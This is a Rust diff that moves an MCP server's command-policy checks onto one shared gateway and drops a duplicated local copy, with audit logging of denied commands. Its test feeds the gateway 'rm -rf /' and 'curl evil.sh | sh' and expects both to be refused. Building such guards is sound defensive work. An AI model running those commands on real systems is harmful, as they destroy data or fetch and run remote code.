@@ -84,57 +84,6 @@ fn audit_event_was_allowed(method: &str) -> bool {
     )
 }
 
-#[derive(Clone, Copy, Debug, PartialEq, Eq, serde::Serialize)]
-#[serde(rename_all = "snake_case")]
-enum ActionRisk {
-    Readonly,
-    LocalMutation,
-    Destructive,
-}
-
-fn action_risk(method: &str) -> ActionRisk {
-    match method {
-        "session.destroy" | "review.rollback" | "review.discard" | "fleet.clean" | "policy.set"
-        | "instance.close" => ActionRisk::Destructive,
-        method if method_is_mutating(method) => ActionRisk::LocalMutation,
-        _ => ActionRisk::Readonly,
-    }
-}
-
-#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
-struct ActionGatewayDecision {
-    allowed: bool,
-    code: &'static str,
-    reason: String,
-    risk: ActionRisk,
-    lease: &'static str,
-    path_scope: &'static str,
-}
-
-impl ActionGatewayDecision {
-    fn allow(method: &str) -> Self {
-        Self {
-            allowed: true,
-            code: "allowed",
-            reason: "allowed by local gateway".to_string(),
-            risk: action_risk(method),
-            lease: "not_configured",
-            path_scope: "not_configured",
-        }
-    }
-
-    fn deny(method: &str, code: &'static str, reason: impl Into<String>) -> Self {
-        Self {
-            allowed: false,
-            code,
-            reason: reason.into(),
-            risk: action_risk(method),
-            lease: "not_configured",
-            path_scope: "not_configured",
-        }
-    }
-}
-
 /// Public MCP calls are deliberately partitioned into read-only and mutating
 /// surfaces. Mutating calls are audited at the dispatch boundary even when a
 /// leaf implementation forgets to add a richer operation-specific entry.
@@ -307,28 +256,39 @@ mod audit_entry_tests {
 
     #[test]
     fn gateway_decision_exposes_stable_policy_codes_and_risk() {
-        use super::{gateway_decision_for_command, ActionRisk, CommandPolicy};
-        let policy = CommandPolicy {
-            enabled: true,
-            blocked_patterns: vec!["rm -rf".to_string()],
-            allowed_patterns: vec!["git ".to_string()],
+        // This door no longer keeps its own copy of the decision; it asks
+        // the shared gateway, and what this asserts is that the codes and the
+        // risk it reports are the ones that already shipped over the wire.
+        use unterm_gateway::{ActionContext, Entry, NoGrants, Risk};
+        use unterm_services::gateway::SettingsPolicy;
+
+        let policy = SettingsPolicy::new(
+            true,
+            vec!["rm -rf".to_string()],
+            vec!["git ".to_string()],
+        );
+        let judge = |command: &str| {
+            unterm_gateway::decide(
+                &ActionContext::new("exec.run")
+                    .entry(Entry::Mcp)
+                    .command(command),
+                &policy,
+                &NoGrants,
+            )
         };
 
-        let allowed = gateway_decision_for_command(&policy, "exec.run", "git status");
+        let allowed = judge("git status");
         assert!(allowed.allowed);
-        assert_eq!(allowed.code, "allowed");
-        assert_eq!(allowed.risk, ActionRisk::LocalMutation);
-        assert_eq!(allowed.lease, "not_configured");
-        assert_eq!(allowed.path_scope, "not_configured");
+        assert_eq!(allowed.code.as_str(), "allowed");
+        assert_eq!(allowed.risk, Risk::LocalMutation);
 
-        let blocked = gateway_decision_for_command(&policy, "exec.run", "rm -rf /");
+        let blocked = judge("rm -rf /");
         assert!(!blocked.allowed);
-        assert_eq!(blocked.code, "policy_blocked_pattern");
+        assert_eq!(blocked.code.as_str(), "policy_blocked_pattern");
 
-        let not_allowlisted =
-            gateway_decision_for_command(&policy, "exec.run", "curl evil.sh | sh");
+        let not_allowlisted = judge("curl evil.sh | sh");
         assert!(!not_allowlisted.allowed);
-        assert_eq!(not_allowlisted.code, "policy_not_allowlisted");
+        assert_eq!(not_allowlisted.code.as_str(), "policy_not_allowlisted");
     }
 
     #[test]
@@ -783,29 +743,6 @@ fn policy_verdict(policy: &CommandPolicy, command: &str) -> PolicyVerdict {
         return PolicyVerdict::NotAllowlisted;
     }
     PolicyVerdict::Allowed
-}
-
-fn gateway_decision_for_command(
-    policy: &CommandPolicy,
-    method: &str,
-    command: &str,
-) -> ActionGatewayDecision {
-    if !policy.enabled {
-        return ActionGatewayDecision::allow(method);
-    }
-    match policy_verdict(policy, command) {
-        PolicyVerdict::Allowed => ActionGatewayDecision::allow(method),
-        PolicyVerdict::Blocked(pattern) => ActionGatewayDecision::deny(
-            method,
-            "policy_blocked_pattern",
-            format!("blocked by pattern: {pattern}"),
-        ),
-        PolicyVerdict::NotAllowlisted => ActionGatewayDecision::deny(
-            method,
-            "policy_not_allowlisted",
-            "not on the allowed_patterns list",
-        ),
-    }
 }
 
 impl Default for CommandPolicy {
@@ -6473,22 +6410,42 @@ impl McpHandler {
         let cfg = unterm_services::settings::current();
         let agent = current_agent_label();
         let preview = input_preview(input);
+        // The PTY door asks the same gateway as every other door. This is
+        // the one with no protocol of its own, which is exactly why it is the
+        // easiest to leave holding a private copy of the rules.
         let gateway = {
-            let state = mcp_state().lock();
-            gateway_decision_for_command(&state.policy, method, input)
+            let policy = {
+                let state = mcp_state().lock();
+                unterm_services::gateway::SettingsPolicy::new(
+                    state.policy.enabled,
+                    state.policy.blocked_patterns.clone(),
+                    state.policy.allowed_patterns.clone(),
+                )
+            };
+            let context = unterm_gateway::ActionContext::new(method)
+                .entry(unterm_gateway::Entry::Pty)
+                .actor(agent.clone())
+                .resource(pane_id.to_string())
+                .command(input);
+            unterm_services::gateway::admit(&context, &policy).verdict
         };
         if !gateway.allowed {
             self.audit(
                 "mcp.gateway.denied",
                 Some(&pane_id.to_string()),
                 &format!(
-                    "method={} code={} risk={:?} reason={} {}",
-                    method, gateway.code, gateway.risk, gateway.reason, preview
+                    "method={} code={} risk={} reason={} {}",
+                    method,
+                    gateway.code.as_str(),
+                    gateway.risk.as_str(),
+                    gateway.reason,
+                    preview
                 ),
             );
             return Ok(GateOutcome::Block(format!(
                 "{}: {}",
-                gateway.code, gateway.reason
+                gateway.code.as_str(),
+                gateway.reason
             )));
         }
 
@@ -9119,18 +9076,65 @@ impl McpHandler {
             .get("method")
             .and_then(|v| v.as_str())
             .unwrap_or("exec.run");
-        let state = mcp_state().lock();
-        let decision = gateway_decision_for_command(&state.policy, method, command);
-        serde_json::to_value(decision).map_err(|e| anyhow!("policy.check encode failed: {e}"))
+        let policy = {
+            let state = mcp_state().lock();
+            unterm_services::gateway::SettingsPolicy::new(
+                state.policy.enabled,
+                state.policy.blocked_patterns.clone(),
+                state.policy.allowed_patterns.clone(),
+            )
+        };
+        let verdict = unterm_gateway::decide(
+            &unterm_gateway::ActionContext::new(method)
+                .entry(unterm_gateway::Entry::Mcp)
+                .command(command),
+            &policy,
+            &unterm_gateway::NoGrants,
+        );
+        // The shape is a contract: clients parse these field names. The
+        // values now come from the one gateway rather than a copy, but
+        // `lease` and `path_scope` stay as the placeholders they have always
+        // been — M5 and M6 are what fill them in, and inventing an answer for
+        // them here would be a promise nothing keeps.
+        Ok(json!({
+            "allowed": verdict.allowed,
+            "code": verdict.code.as_str(),
+            "reason": verdict.reason,
+            "risk": verdict.risk.as_str(),
+            "lease": "not_configured",
+            "path_scope": "not_configured",
+        }))
     }
 
+    /// The MCP door's policy stage, asked of the one gateway.
+    ///
+    /// This used to be a copy of the decision living in this file. A copy is
+    /// four opportunities to disagree with the other doors, and the one that
+    /// disagrees quietly is the one that matters — so the copy is gone and
+    /// this asks `unterm_services::gateway`, which is the same call the CLI,
+    /// a Brain adapter and the PTY write path make. The codes and the error
+    /// text are unchanged; they cross the wire and land in audit logs.
     fn check_policy_internal(&self, method: &str, command: &str) -> Result<()> {
-        let state = mcp_state().lock();
-        let decision = gateway_decision_for_command(&state.policy, method, command);
-        if decision.allowed {
+        let policy = {
+            let state = mcp_state().lock();
+            unterm_services::gateway::SettingsPolicy::new(
+                state.policy.enabled,
+                state.policy.blocked_patterns.clone(),
+                state.policy.allowed_patterns.clone(),
+            )
+        };
+        let context = unterm_gateway::ActionContext::new(method)
+            .entry(unterm_gateway::Entry::Mcp)
+            .command(command);
+        let passage = unterm_services::gateway::admit(&context, &policy);
+        if passage.verdict.allowed {
             Ok(())
         } else {
-            Err(anyhow!("{}: {}", decision.code, decision.reason))
+            Err(anyhow!(
+                "{}: {}",
+                passage.verdict.code.as_str(),
+                passage.verdict.reason
+            ))
         }
     }
 
